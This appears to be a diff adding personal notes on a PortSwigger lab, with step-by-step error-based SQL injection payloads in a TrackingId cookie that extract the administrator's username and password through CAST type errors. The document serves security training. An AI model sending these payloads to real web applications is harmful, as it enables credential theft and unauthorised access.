@@ -1,0 +1,29 @@
+
+[ WEB > SQLI > MYSQL > VISIBLE ERROR ]
+
+// Inject quote into cookie value, breaks app
+Cookie: TrackingId=aIccTSOgq6DszhnI'
+
+// Comment line, fixes request
+Cookie: TrackingId=aIccTSOgq6DszhnI'--
+
+// Test a query...
+// Not sure why PortSwigger made this so complicated.
+// Could just: ' and true--
+Cookie: TrackingId=aIccTSOgq6DszhnI' and 1=cast((select 1) as int)--
+
+// Try a query to grab good data
+Cookie: TrackingId=aIccTSOgq6DszhnI' and 1=cast((select username from users) as int)--
+
+// Due to query length, code breaks. Shorten it up.
+// This new code gives error, "more than one row returned"
+Cookie: TrackingId=' and 1=cast((select username from users) as int)--
+
+// To fix the previous error, limit to one row.
+// This throws a type error.
+// However, that error reveals that row 1 is the administrator user.
+Cookie: TrackingId=' and 1=cast((select username from users limit 1) as int)--
+
+// Now we can get the password...
+Cookie: TrackingId=' and 1=cast((select password from users limit 1) as int)--
+
